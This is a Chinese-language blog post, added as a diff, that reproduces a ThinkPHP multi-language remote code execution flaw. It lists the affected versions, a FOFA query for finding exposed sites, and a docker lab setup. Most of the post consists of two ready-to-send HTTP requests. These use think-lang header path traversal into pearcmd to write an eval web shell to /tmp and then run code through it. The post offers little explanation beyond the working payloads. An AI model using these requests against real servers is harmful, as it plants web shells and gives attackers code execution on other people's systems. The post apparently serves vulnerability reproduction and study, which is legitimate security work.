@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Think PHP 多语言RCE影响范围本次漏洞影响范围如下： 123v6.0.1 &lt; Thinkphp &lt; v6.0.13 Thinkphp v5.0.x Thinkphp v5.1.x   FOFA 语法： 1header&#x3D;&quot;think_lang&quot; 要求： 121、需要Thinkphp开启多语言功能2、需要有pearcmd扩展 复现环境： 12docker ru">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ThinkPHP 多语言RCE">
+<meta property="og:url" content="https://garckz.github.io/2023/02/24/ThinkPHP%20%E5%A4%9A%E8%AF%AD%E8%A8%80RCE/index.html">
+<meta property="og:site_name" content="兀自">
+<meta property="og:description" content="Think PHP 多语言RCE影响范围本次漏洞影响范围如下： 123v6.0.1 &lt; Thinkphp &lt; v6.0.13 Thinkphp v5.0.x Thinkphp v5.1.x   FOFA 语法： 1header&#x3D;&quot;think_lang&quot; 要求： 121、需要Thinkphp开启多语言功能2、需要有pearcmd扩展 复现环境： 12docker ru">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://garckz.github.io/2023/02/24/ThinkPHP%20%E5%A4%9A%E8%AF%AD%E8%A8%80RCE/NCwfWVvRgWz82eLRr8l1N7EHtG7Khg_2feCTjwY4uOY.png">
+<meta property="og:image" content="https://garckz.github.io/2023/02/24/ThinkPHP%20%E5%A4%9A%E8%AF%AD%E8%A8%80RCE/GLWHx5a3SsGhTvmxKP5FEPt2BFMzg-DHNtC22UxI2Jg.png">
+<meta property="article:published_time" content="2023-02-24T03:40:49.000Z">
+<meta property="article:modified_time" content="2023-05-11T13:56:06.230Z">
+<meta property="article:author" content="Garck3h">
+<meta property="article:tag" content="漏洞复现">
+<meta property="article:tag" content="Thinkphp">
+<meta property="article:tag" content="RCE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://garckz.github.io/2023/02/24/ThinkPHP%20%E5%A4%9A%E8%AF%AD%E8%A8%80RCE/NCwfWVvRgWz82eLRr8l1N7EHtG7Khg_2feCTjwY4uOY.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>ThinkPHP 多语言RCE</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">文章</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2023/04/11/%E4%B8%AD%E9%97%B4%E4%BB%B6MinIO%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%AF%BC%E8%87%B4%E7%9A%84RCE%EF%BC%88CVE-2023-28432%EF%BC%89/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2020/02/29/%E6%90%AD%E5%BB%BAHexo%E5%8D%9A%E5%AE%A2%E8%BF%9B%E9%98%B6/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://garckz.github.io/2023/02/24/ThinkPHP%20%E5%A4%9A%E8%AF%AD%E8%A8%80RCE/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://garckz.github.io/2023/02/24/ThinkPHP%20%E5%A4%9A%E8%AF%AD%E8%A8%80RCE/&text=ThinkPHP 多语言RCE"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://garckz.github.io/2023/02/24/ThinkPHP%20%E5%A4%9A%E8%AF%AD%E8%A8%80RCE/&title=ThinkPHP 多语言RCE"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://garckz.github.io/2023/02/24/ThinkPHP%20%E5%A4%9A%E8%AF%AD%E8%A8%80RCE/&is_video=false&description=ThinkPHP 多语言RCE"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ThinkPHP 多语言RCE&body=Check out this article: https://garckz.github.io/2023/02/24/ThinkPHP%20%E5%A4%9A%E8%AF%AD%E8%A8%80RCE/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://garckz.github.io/2023/02/24/ThinkPHP%20%E5%A4%9A%E8%AF%AD%E8%A8%80RCE/&title=ThinkPHP 多语言RCE"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://garckz.github.io/2023/02/24/ThinkPHP%20%E5%A4%9A%E8%AF%AD%E8%A8%80RCE/&title=ThinkPHP 多语言RCE"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://garckz.github.io/2023/02/24/ThinkPHP%20%E5%A4%9A%E8%AF%AD%E8%A8%80RCE/&title=ThinkPHP 多语言RCE"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://garckz.github.io/2023/02/24/ThinkPHP%20%E5%A4%9A%E8%AF%AD%E8%A8%80RCE/&title=ThinkPHP 多语言RCE"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://garckz.github.io/2023/02/24/ThinkPHP%20%E5%A4%9A%E8%AF%AD%E8%A8%80RCE/&name=ThinkPHP 多语言RCE&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://garckz.github.io/2023/02/24/ThinkPHP%20%E5%A4%9A%E8%AF%AD%E8%A8%80RCE/&t=ThinkPHP 多语言RCE"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Think-PHP-%E5%A4%9A%E8%AF%AD%E8%A8%80RCE"><span class="toc-number">1.</span> <span class="toc-text">Think PHP 多语言RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-number">1.1.</span> <span class="toc-text">影响范围</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell"><span class="toc-number">1.2.</span> <span class="toc-text">getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phpinfo"><span class="toc-number">1.3.</span> <span class="toc-text">phpinfo</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        ThinkPHP 多语言RCE
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Garck3h</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-02-24T03:40:49.000Z" class="dt-published" itemprop="datePublished">2023-02-24</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/RCE/" rel="tag">RCE</a>, <a class="p-category" href="/tags/Thinkphp/" rel="tag">Thinkphp</a>, <a class="p-category" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="Think-PHP-多语言RCE"><a href="#Think-PHP-多语言RCE" class="headerlink" title="Think PHP 多语言RCE"></a>Think PHP 多语言RCE</h1><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>本次漏洞影响范围如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v6.0.1 &lt; Thinkphp &lt; v6.0.13 </span><br><span class="line">Thinkphp v5.0.x </span><br><span class="line">Thinkphp v5.1.x</span><br></pre></td></tr></table></figure>
+
+
+<p>FOFA 语法：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header=<span class="string">&quot;think_lang&quot;</span></span><br></pre></td></tr></table></figure>
+<p>要求：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、需要Thinkphp开启多语言功能</span><br><span class="line">2、需要有pearcmd扩展</span><br></pre></td></tr></table></figure>
+<p>复现环境：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -d -p 8080:80  vulfocus/thinkphp:6.0.12</span><br><span class="line">访问8080</span><br></pre></td></tr></table></figure>
+<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /<span class="keyword">public</span>/index.php?+config-create+/&lt;?=<span class="meta">@eval($_REQUEST[&#x27;w&#x27;])</span>;?&gt;+/tmp/nihao2.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span><span class="number">.134</span><span class="number">.154</span>:<span class="number">8066</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">9.0</span> (Macintosh; M2 Mac OS X <span class="number">16.12</span>; rv:<span class="number">129.0</span>) Gecko/<span class="number">20230101</span> Firefox/<span class="number">169.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">think-lang:../../../../../../../../usr/local/lib/php/pearcmd</span></span><br><span class="line"><span class="comment">Connection: keep-alive</span></span><br><span class="line"><span class="comment">Cookie: think_lang=zh-cn</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment"></span></span><br></pre></td></tr></table></figure>
+<p><img src="NCwfWVvRgWz82eLRr8l1N7EHtG7Khg_2feCTjwY4uOY.png" alt="image"></p>
+<h2 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /<span class="keyword">public</span>/index.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span><span class="number">.134</span><span class="number">.154</span>:<span class="number">8066</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">9.0</span> (Macintosh; M2 Mac OS X <span class="number">16.12</span>; rv:<span class="number">129.0</span>) Gecko/<span class="number">20230101</span> Firefox/<span class="number">169.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">think-lang:../../../../../../../../tmp/nihao2</span></span><br><span class="line"><span class="comment">Connection: keep-alive</span></span><br><span class="line"><span class="comment">Cookie: think_lang=zh-cn</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 12</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">w=phpinfo();</span></span><br></pre></td></tr></table></figure>
+<p><img src="GLWHx5a3SsGhTvmxKP5FEPt2BFMzg-DHNtC22UxI2Jg.png" alt="image"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/archives/">文章</a></li>
+        
+          <li><a href="/categories/">分类</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Think-PHP-%E5%A4%9A%E8%AF%AD%E8%A8%80RCE"><span class="toc-number">1.</span> <span class="toc-text">Think PHP 多语言RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-number">1.1.</span> <span class="toc-text">影响范围</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell"><span class="toc-number">1.2.</span> <span class="toc-text">getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phpinfo"><span class="toc-number">1.3.</span> <span class="toc-text">phpinfo</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://garckz.github.io/2023/02/24/ThinkPHP%20%E5%A4%9A%E8%AF%AD%E8%A8%80RCE/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://garckz.github.io/2023/02/24/ThinkPHP%20%E5%A4%9A%E8%AF%AD%E8%A8%80RCE/&text=ThinkPHP 多语言RCE"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://garckz.github.io/2023/02/24/ThinkPHP%20%E5%A4%9A%E8%AF%AD%E8%A8%80RCE/&title=ThinkPHP 多语言RCE"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://garckz.github.io/2023/02/24/ThinkPHP%20%E5%A4%9A%E8%AF%AD%E8%A8%80RCE/&is_video=false&description=ThinkPHP 多语言RCE"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ThinkPHP 多语言RCE&body=Check out this article: https://garckz.github.io/2023/02/24/ThinkPHP%20%E5%A4%9A%E8%AF%AD%E8%A8%80RCE/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://garckz.github.io/2023/02/24/ThinkPHP%20%E5%A4%9A%E8%AF%AD%E8%A8%80RCE/&title=ThinkPHP 多语言RCE"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://garckz.github.io/2023/02/24/ThinkPHP%20%E5%A4%9A%E8%AF%AD%E8%A8%80RCE/&title=ThinkPHP 多语言RCE"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://garckz.github.io/2023/02/24/ThinkPHP%20%E5%A4%9A%E8%AF%AD%E8%A8%80RCE/&title=ThinkPHP 多语言RCE"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://garckz.github.io/2023/02/24/ThinkPHP%20%E5%A4%9A%E8%AF%AD%E8%A8%80RCE/&title=ThinkPHP 多语言RCE"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://garckz.github.io/2023/02/24/ThinkPHP%20%E5%A4%9A%E8%AF%AD%E8%A8%80RCE/&name=ThinkPHP 多语言RCE&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://garckz.github.io/2023/02/24/ThinkPHP%20%E5%A4%9A%E8%AF%AD%E8%A8%80RCE/&t=ThinkPHP 多语言RCE"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+    <div class="footer-left">
+        Copyright &copy;
+        
+        
+        2019-2023
+        Garck3h
+    </div>
+    <div class="footer-right">
+        <nav>
+
+            <ul>
+                
+                    <!-- 不蒜子统计 -->
+                    <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+
+                    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+                
+            </ul>
+
+
+        </nav>
+    </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
